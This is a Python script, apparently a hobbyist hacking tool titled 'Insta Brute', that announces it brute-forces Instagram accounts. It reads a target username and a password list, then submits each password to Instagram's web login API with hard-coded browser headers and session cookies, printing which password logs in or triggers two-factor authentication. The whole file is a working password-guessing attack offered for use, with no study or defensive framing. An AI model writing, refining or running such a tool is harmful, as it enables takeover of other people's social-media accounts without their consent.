
import requests
from colorama import Fore, init

class Colors:
    def __init__(self):
        self.green = "\033[38;5;28m"

ga = Colors()
init()

print(Fore.RESET + '''
                            AA
                           AAA
                          AAA
                         AAA AAA
                        AAA  AAAA
                       AAA  AAAAAA
                      AAA  AAA  AAA
                     AAA  AAA    AAA
                    AAA  AAA      AAA
                   AAAAAAAAAAAAAAAAAAA
                       AAAA
                      AAAA
                     AAAA
''')
print(Fore.RED + '''
+=====================================================+
| █████                     █████                     |
|░░███                     ░░███                      |
| ░███  ████████    █████  ███████    ██████          |
| ░███ ░░███░░███  ███░░  ░░░███░    ░░░░░███         |
| ░███  ░███ ░███ ░░█████   ░███      ███████         |
| ░███  ░███ ░███  ░░░░███  ░███ ███ ███░░███         |
| █████ ████ █████ ██████   ░░█████ ░░████████        |
|░░░░░ ░░░░ ░░░░░ ░░░░░░     ░░░░░   ░░░░░░░░         |
|                                                     |
|                                                     |
|                                                     |
| ███████████                        █████            |
|░░███░░░░░███                      ░░███             |
| ░███    ░███ ████████  █████ ████ ███████    ██████ |
| ░██████████ ░░███░░███░░███ ░███ ░░░███░    ███░░███|
| ░███░░░░░███ ░███ ░░░  ░███ ░███   ░███    ░███████ |
| ░███    ░███ ░███      ░███ ░███   ░███ ███░███░░░  |
| ███████████  █████     ░░████████  ░░█████ ░░██████ |
|░░░░░░░░░░░  ░░░░░       ░░░░░░░░    ░░░░░   ░░░░░░  |
+=====================================================+
''')
print(Fore.RESET+'''
v1.2    
This tool helps you to bruteforce an instagram account.
Buy me a coffee...
Copyright: @ALHARAM             
''')

username = input('Enter Your User: ')
passwords = input('Enter Your Pass File Path: ')

headers = {    
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'en-US,en;q=0.9',
    'content-length': '349',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=IRV_fo73Vs9MKx_xGIbrZl; mid=ZtyfdAAEAAGAtNVnRC0j8zC1X_Gv; datr=dJ_cZtiTmh6M-zMfGFDeQwMw; ig_did=DFCCCD49-3493-4BFD-8639-EFDAE66D04AE; wd=562x964',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-asbd-id': '129477',
    'x-csrftoken': 'IRV_fo73Vs9MKx_xGIbrZl',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1016305606',
    'x-requested-with': 'XMLHttpRequest',
}


def main():
        with open(passwords, 'r') as file:
            passwordss = file.read().splitlines()
            for password in passwordss :
                loginurl = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
                data = {
                    'username': username,
                    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+password
                }
                reqlogin = requests.post(loginurl, data=data, headers=headers).text
                if ('"authenticated": true') in reqlogin:
                     print(ga.green+f'[*] Done login with {username}==>{password}')
                elif ('"two_factor_required":true') in reqlogin:
                     print(ga.green+f'[*] Login successfully with {password}')
                     print(Fore.YELLOW+'[+] The account is secure with 2FA...')
                     break
                else:
                     print(Fore.RED+'[x]',Fore.RESET+f'{password}')
main()
